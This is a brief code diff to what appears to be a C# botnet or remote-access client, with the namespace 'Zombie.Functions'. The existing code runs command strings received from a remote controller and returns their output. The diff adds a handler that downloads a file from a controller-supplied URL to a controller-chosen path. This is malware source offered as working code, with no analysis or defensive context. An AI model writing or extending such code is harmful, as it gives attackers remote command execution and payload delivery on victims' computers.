@@ -19,6 +19,9 @@ namespace Zombie.Functions
                 case CommandFlags.RemoteCMD:
                     Client.Send(RemoteCMD.ExecuteCommand(reader.ReadString()));
                     break;
+                case CommandFlags.ZombieDownloadFileRequest:
+                    Download.FromURL(reader.ReadString(), reader.ReadString());
+                    break;
                 default:
                     throw new ArgumentException("No command corresponding to the given value.");
 
